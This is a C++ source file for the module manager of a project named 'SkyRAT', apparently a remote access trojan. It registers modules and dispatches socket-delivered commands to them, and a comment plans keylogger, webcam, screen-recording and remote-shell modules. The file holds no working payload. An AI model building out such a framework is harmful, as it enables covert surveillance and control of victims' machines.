#include "ModuleManager.h"
#include <iostream>
#include <algorithm>

namespace SkyRAT {
namespace Modules {

    ModuleManager::ModuleManager() {
        registerBuiltinModules();
    }

    ModuleManager::~ModuleManager() {
        shutdownModules();
    }

    bool ModuleManager::initializeModules() {
        std::cout << "[ModuleManager] Initializing " << m_modules.size() << " modules..." << std::endl;

        for (auto& module : m_modules) {
            try {
                if (!module->initialize()) {
                    std::cerr << "[ModuleManager] Failed to initialize module: " 
                             << module->getName() << std::endl;
                    return false;
                }
                std::cout << "[ModuleManager] Initialized module: " << module->getName() << std::endl;
            } catch (const std::exception& e) {
                std::cerr << "[ModuleManager] Exception initializing module " 
                         << module->getName() << ": " << e.what() << std::endl;
                return false;
            }
        }

        std::cout << "[ModuleManager] All modules initialized successfully" << std::endl;
        return true;
    }

    void ModuleManager::shutdownModules() {
        std::cout << "[ModuleManager] Shutting down modules..." << std::endl;

        // Shutdown in reverse order
        for (auto it = m_modules.rbegin(); it != m_modules.rend(); ++it) {
            try {
                (*it)->shutdown();
                std::cout << "[ModuleManager] Shutdown module: " << (*it)->getName() << std::endl;
            } catch (const std::exception& e) {
                std::cerr << "[ModuleManager] Exception shutting down module " 
                         << (*it)->getName() << ": " << e.what() << std::endl;
            }
        }
    }

    void ModuleManager::registerModule(std::unique_ptr<IModule> module) {
        if (module) {
            std::string name = module->getName();
            m_modulesByName[name] = module.get();
            m_modules.push_back(std::move(module));
            std::cout << "[ModuleManager] Registered module: " << name << std::endl;
        }
    }

    IModule* ModuleManager::getModule(const std::string& name) {
        auto it = m_modulesByName.find(name);
        return (it != m_modulesByName.end()) ? it->second : nullptr;
    }

    std::vector<IModule*> ModuleManager::getAllModules() {
        std::vector<IModule*> modules;
        modules.reserve(m_modules.size());
        
        for (const auto& module : m_modules) {
            modules.push_back(module.get());
        }
        
        return modules;
    }

    bool ModuleManager::canHandleCommand(const std::string& command) const {
        // Check if any registered module can handle this command
        for (const auto& module : m_modules) {
            if (module->canHandleCommand(command)) {
                return true;
            }
        }
        return false;
    }

    bool ModuleManager::executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) {
        // Find the first module that can handle this command and execute it
        for (const auto& module : m_modules) {
            if (module->canHandleCommand(command)) {
                try {
                    bool result = module->executeCommand(command, arguments, socket);
                    std::cout << "[ModuleManager] Module '" << module->getName() 
                              << "' executed command '" << command << "' with result: " 
                              << (result ? "SUCCESS" : "FAILURE") << std::endl;
                    return result;
                } catch (const std::exception& e) {
                    std::cerr << "[ModuleManager] Exception executing command '" << command 
                              << "' in module '" << module->getName() << "': " << e.what() << std::endl;
                    return false;
                }
            }
        }
        
        std::cerr << "[ModuleManager] No module found to handle command: " << command << std::endl;
        return false;
    }

    std::vector<std::string> ModuleManager::getSupportedCommands() const {
        std::vector<std::string> allCommands;
        
        for (const auto& module : m_modules) {
            auto moduleCommands = module->getSupportedCommands();
            allCommands.insert(allCommands.end(), moduleCommands.begin(), moduleCommands.end());
        }
        
        return allCommands;
    }

    void ModuleManager::registerBuiltinModules() {
        // TODO: Register built-in modules here when they are migrated
        // This will be implemented in the individual module migration todos:
        // - Screenshot Module
        // - Keylogger Module  
        // - Screen Recording Module
        // - Remote Shell Module
        // - Mouse Control Module
        // - Webcam Module
        
        std::cout << "[ModuleManager] Built-in modules registration placeholder" << std::endl;
    }

} // namespace Modules
} // namespace SkyRAT